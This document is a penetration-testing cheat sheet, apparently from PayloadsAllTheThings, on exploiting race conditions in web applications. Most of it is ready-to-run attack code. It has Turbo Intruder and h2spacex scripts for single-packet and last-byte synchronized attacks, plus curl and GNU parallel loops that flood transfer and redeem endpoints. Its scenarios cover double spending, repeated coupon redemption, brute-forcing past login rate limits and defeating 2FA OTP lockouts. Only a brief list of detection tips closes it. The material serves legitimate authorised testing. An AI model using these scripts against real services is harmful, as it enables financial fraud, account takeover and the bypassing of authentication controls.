# Race Condition Payloads

> Source: PayloadsAllTheThings — Race Condition

## Core Concepts

Race conditions exploit timing windows where multiple concurrent requests can bypass server-side checks (balance verification, coupon limits, vote counts, rate limiters).

## HTTP/2 Single-Packet Attack

Send 20-30 requests simultaneously in a single TCP packet, ensuring they arrive at the server at the exact same time.

### Burp Suite (Repeater)

```
1. Create the request to repeat
2. Duplicate it 20-30 times (Ctrl+R)
3. Select all tabs -> right-click -> "Create tab group"
4. Send group in parallel (single-packet attack)
```

### Turbo Intruder (Burp Extension)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.HTTP2)

    # Queue all requests with a gate
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Release all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### h2spacex (Python)

```python
from h2spacex import H2OnePkt

h2_conn = H2OnePkt('https://target.com', len(requests))
for req in requests:
    h2_conn.send(req)
h2_conn.perform()
```

## HTTP/1.1 Last-Byte Synchronization

For servers that don't support HTTP/2:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)

    for i in range(30):
        engine.queue(target.req, gate='race1')

    # This holds back the last byte of each request
    # then releases them all simultaneously
    engine.openGate('race1')
```

## Common Attack Scenarios

### Limit Overrun (Double Spending)

```
Target: POST /api/transfer
Body: {"to": "attacker", "amount": 1000}

Send 20 concurrent requests -> balance deducted once, credited 20 times
```

### Coupon / Gift Card Redemption

```
Target: POST /api/redeem
Body: {"code": "DISCOUNT50"}

Send 30 concurrent requests -> coupon applied multiple times
```

### Rate Limit Bypass (Brute Force)

```
Target: POST /api/login
Body: {"user": "admin", "pass": "<bruteforce>"}

Use single-packet attack with 20 different passwords per batch
-> bypasses "5 attempts per minute" rate limit
```

### 2FA Bypass

```
Target: POST /api/verify-otp
Body: {"otp": "<value>"}

Send 30 concurrent requests with different OTP values
-> bypasses "3 attempts" lockout
```

### Multi-Endpoint Race

```
Thread 1: POST /api/check-balance    (reads balance: $1000)
Thread 2: POST /api/transfer         (sends $1000)
Thread 3: POST /api/transfer         (also sends $1000 — balance not yet updated)
```

## Testing with curl

```bash
# Simple parallel requests
for i in $(seq 1 20); do
  curl -s -X POST http://target/api/redeem \
    -H "Cookie: session=xxx" \
    -d '{"code":"COUPON"}' &
done
wait
```

```bash
# Using GNU parallel
seq 1 50 | parallel -j50 curl -s -X POST http://target/api/transfer \
  -H "Cookie: session=xxx" \
  -d "'{"amount":100}'"
```

## Tools

| Tool | Usage |
|------|-------|
| **Turbo Intruder** | Burp extension, gate-based synchronization |
| **h2spacex** | Python library, HTTP/2 single-packet |
| **racepwn** | Automated race condition testing |
| **Burp Repeater** | Native parallel tab group feature |
| **GNU parallel** | CLI-based concurrent requests |

## Detection Tips

```
1. Look for TOCTOU patterns (Time of Check vs Time of Use)
2. Test any endpoint with counters/limits/balances
3. Compare: single request result vs 20 concurrent request results
4. Check for inconsistencies in response (same ID returned twice, etc.)
5. Monitor side effects: email sent twice, record created twice
```
